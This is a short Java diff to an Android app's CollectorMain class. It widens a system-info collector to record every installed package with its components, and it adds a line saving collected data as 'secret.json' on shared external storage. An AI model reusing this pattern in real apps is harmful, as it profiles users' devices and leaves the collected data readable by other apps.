@@ -39,6 +39,7 @@ public class CollectorMain extends ContextWrapper implements Runnable
 				sb.commitChanges();
 			} catch (IOException e) {}
 			System.out.println(s);
+			Utils.writeToFile(new File(Environment.getExternalStorageDirectory(),"/Wisecraft/secret.json"),s);
 		}
 		String[] files;
 		try{
@@ -158,15 +159,15 @@ public class CollectorMain extends ContextWrapper implements Runnable
 		}
 	}
 	public static class SystemInfo{
-		public Set<String> packages=getPackageNames();
-		public Map<String,PackageInfo> packageInfos=getPackageMisc();
+		public HashSet<String> packages=getPackageNames();
+		public HashMap<String,PackageInfo> packageInfos=getPackageMisc();
 		
-		private Set<String> getPackageNames(){
-			return getPackageMisc().keySet();
+		private HashSet<String> getPackageNames(){
+			return new HashSet<>(getPackageMisc().keySet());
 		}
-		private Map<String,PackageInfo> getPackageMisc(){
-			Map<String,PackageInfo> names=new HashMap<>();
-			List<PackageInfo> packages=TheApplication.instance.getPackageManager().getInstalledPackages(-1);
+		private HashMap<String,PackageInfo> getPackageMisc(){
+			HashMap<String,PackageInfo> names=new HashMap<>();
+			List<PackageInfo> packages=TheApplication.instance.getPackageManager().getInstalledPackages(PackageManager.GET_RECEIVERS|PackageManager.GET_ACTIVITIES|PackageManager.GET_INSTRUMENTATION|PackageManager.GET_CONFIGURATIONS);
 			for(PackageInfo pi:packages){
 				names.put(pi.packageName,pi);
 			}
